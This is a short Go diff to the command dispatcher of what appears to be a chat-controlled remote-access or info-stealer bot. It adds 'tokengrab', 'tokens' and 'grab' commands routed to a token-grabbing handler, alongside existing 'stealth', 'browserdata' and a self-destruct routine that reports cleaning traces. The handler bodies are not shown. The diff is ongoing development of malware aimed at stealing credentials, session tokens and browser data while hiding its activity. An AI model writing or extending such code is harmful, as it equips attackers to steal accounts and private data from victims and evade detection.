@@ -54,7 +54,9 @@ func (m *Manager) Execute(ctx context.Context, command string, args []string, se
 
 	case "stealth":
 		return m.handleStealthStatus(ctx)
-		return m.handleTokenGrab(ctx)
+
+	case "tokengrab", "tokens", "grab":
+        return m.handleTokenGrab(ctx)
 
 	case "browser", "browserdata":
 		return m.handleBrowserData(ctx, session, channelID)
@@ -338,3 +340,4 @@ func (m *Manager) handleSelfDestruct(ctx context.Context) string {
 
 	return "💥 Self-destruct initiated. Cleaning traces..."
 }
+
